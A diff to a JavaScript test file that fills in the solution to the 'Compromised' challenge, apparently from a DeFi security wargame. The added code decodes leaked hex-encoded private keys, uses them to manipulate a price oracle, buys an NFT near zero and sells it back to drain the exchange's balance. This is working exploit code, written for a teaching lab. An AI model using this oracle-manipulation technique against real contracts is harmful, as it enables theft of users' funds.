@@ -1,5 +1,16 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
+var Web3 = require('web3');
+var web3 = new Web3();
+
+function hexKeyToAccount(hexKey) {
+    return web3.eth.accounts.privateKeyToAccount(
+        Buffer.from(
+            Buffer.from(hexKey.split(' ').join(''), 'hex').toString('utf-8'),
+            'base64'
+        ).toString('utf-8')
+    );
+}
 
 describe('Compromised challenge', function () {
 
@@ -61,6 +72,39 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const src1 = hexKeyToAccount('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35');
+        const src2 = hexKeyToAccount('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34');
+
+        const w1 = new ethers.Wallet(src1, ethers.provider);
+        const w2 = new ethers.Wallet(src2, ethers.provider);
+
+        console.log("NFT price before : " , ethers.utils.formatEther((await this.oracle.getMedianPrice("DVNFT")).toString()));
+
+        await this.oracle.connect(w1).postPrice("DVNFT", 0);
+        await this.oracle.connect(w2).postPrice("DVNFT", 0);
+
+        console.log("NFT price after : " , ethers.utils.formatEther((await this.oracle.getMedianPrice("DVNFT")).toString()));
+
+        await this.exchange.connect(attacker).buyOne({value: 1});
+        // 0 tokenId is minted
+
+        exchangeBalance = await ethers.provider.getBalance(this.exchange.address)
+
+        await this.oracle.connect(w1).postPrice("DVNFT", exchangeBalance);
+        await this.oracle.connect(w2).postPrice("DVNFT", exchangeBalance);
+
+        res = await this.nftToken.balanceOf(attacker.address);
+        console.log("NFT balance of attacker : ", res.toNumber());
+
+        console.log("Exchange balance before Sell : ", ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address)));
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        console.log("Exchange balance after Sell : ", ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address)));
+
+        await this.oracle.connect(w1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(w2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
